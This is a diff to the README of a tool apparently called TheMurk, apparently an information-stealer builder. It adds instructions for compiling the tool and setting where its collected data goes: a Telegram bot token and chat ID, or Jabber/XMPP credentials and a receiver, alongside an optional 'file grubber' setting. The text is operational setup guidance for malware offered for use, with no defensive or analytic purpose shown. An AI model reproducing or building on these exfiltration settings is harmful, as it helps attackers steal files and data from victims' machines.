@@ -126,6 +126,8 @@ So firstly, go to the [@BotFather](https://t.me/BotFather) bot and create your o
 Now you need to get your chat id. To do this, go to the next bot [@ShowJsonBot](https://t.me/ShowJsonBot) and save the id.  
 Insert this data in builder console. And wait, secure building will take about 2 minutes.
 
+---
+
 ### 🔨Building(manually)
 
 ### 🎮For Discord
@@ -141,8 +143,17 @@ and run `Compile.bat`
 Finally, insert the name and webhook link in the `TheMurk.py` here
 ```
 enableFileGrubber = False # do you want to use file grubber
-sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP
+sendType = 1 # 0 via Discord; 1 via Telegram; 2 via XMPP
 TelegramData = ["HTTPAPI that you got from botFather","your chat ID"]
+```
+and run `Compile.bat`
+
+### 📡For XMPP
+Finally, insert the name and webhook link in the `TheMurk.py` here
+```
+enableFileGrubber = False # do you want to use file grubber
+sendType = 2 # 0 via Discord; 1 via Telegram; 2 via XMPP
+xmppData = ["jabberid","jabberpassword","jabberreceiver"]
 ```
 and run `Compile.bat`
 
